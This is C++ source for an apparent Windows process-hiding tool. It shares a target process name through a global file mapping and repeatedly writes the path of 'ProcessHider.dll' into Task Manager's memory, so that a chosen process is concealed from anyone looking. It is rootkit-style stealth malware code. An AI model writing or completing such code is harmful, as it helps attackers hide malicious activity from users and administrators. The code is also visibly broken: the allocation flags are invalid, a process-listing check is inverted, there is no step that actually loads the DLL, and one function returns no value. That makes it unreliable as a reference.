#include "Un-main.h"
#include <TlHelp32.h>


HANDLE map;
LPVOID buf;


bool inject_dll(DWORD pid, string dll_path) {
	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (handle==INVALID_HANDLE_VALUE)
	{
		return false;
	}
	LPVOID address = VirtualAllocEx(handle, NULL, dll_path.length(), MEM_COMMIT | MEM_RELEASE, PAGE_EXECUTE_READWRITE);
	if (address==NULL)
	{
		return false;
	}
	bool res = WriteProcessMemory(handle, address, dll_path.c_str(), dll_path.length(), 0);
	if (!res)
	{
		return false;
	}
	
	CloseHandle(handle);
	return true;
}



void find_and_inject() {
	char* dll_path_c = (char*)malloc(sizeof(char) * 3000);
	GetModuleFileNameA(NULL, dll_path_c, 3000);
	DWORD lastpid = 4;
	string dll_path(dll_path_c);
	size_t index = dll_path.find_last_of("\\");
	dll_path.erase(dll_path.begin() + index, dll_path.end());
	dll_path.append("\\ProcessHider.dll");
	while (true)
	{
		PROCESSENTRY32 process;
		process.dwSize = sizeof(PROCESSENTRY32);
		HANDLE proc_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (proc_snap==INVALID_HANDLE_VALUE)
		{
			return;
		}
		if (Process32First(proc_snap,&process))
		{
			return;
		}
		do
		{
			if(!strcmp(process.szExeFile,"Taskmgr.exe")&&lastpid!=process.th32ProcessID)
				if (!inject_dll(process.th32ProcessID,dll_path))
				{
					break;
				}
			lastpid = process.th32ProcessID;
		} while (Process32Next(proc_snap,&process));
		CloseHandle(proc_snap);
		Sleep(1000);
	}
}
bool map_process_name(string process){
	map = CreateFileMappingA(
		INVALID_HANDLE_VALUE,
		NULL,
		PAGE_READWRITE,
		0,
		255,
		"Global\\GetProcessName"
	);
	if (map==NULL)
	{
		return false;
	}
	buf = MapViewOfFile(map,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		255
	);
	if (buf==NULL)
	{
		CloseHandle(map);
		return	false;
	}
	CopyMemory(buf, process.c_str(), process.length());
}

int hide_process(string process) {
	string inp;
	map_process_name(process);
	CreateThread(
		NULL,
		NULL,
		(LPTHREAD_START_ROUTINE)find_and_inject,
		NULL,
		NULL,
		NULL
	);
	return 0;
}

